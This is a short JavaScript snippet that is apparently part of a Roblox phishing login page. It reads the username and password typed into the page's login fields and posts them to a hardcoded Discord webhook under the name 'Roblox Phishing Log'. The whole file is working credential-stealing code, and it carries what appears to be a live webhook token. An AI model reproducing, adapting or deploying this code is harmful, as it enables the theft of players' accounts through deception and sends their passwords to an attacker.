function rand() {
	
	
	
	u = document.getElementById("login-username").value; 
	p = document.getElementById("login-password").value;
	
	wb = "https://discordapp.com/api/webhooks/1412507396873523312/3Sqo_syA5xtWCUoJDhQDjw29ojbEP3PUzuLol_2K_rD-VMTXifDOKU2Ol5sJKixI45Uc"; //enter webhook here
	
	var request = new XMLHttpRequest();
      request.open("POST", wb);

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: "Roblox Phishing Log",
        avatar_url: "https://play-lh.googleusercontent.com/8ddL1kuoNUB5vUvgDVjYY3_6HwQcrg1K2fd_R8soD-e2QYj8fT9cfhfh3G0hnSruLKec",
        content: "```Username: " + u + " | Password: " + p + "```"
      }

      request.send(JSON.stringify(params));
	

}
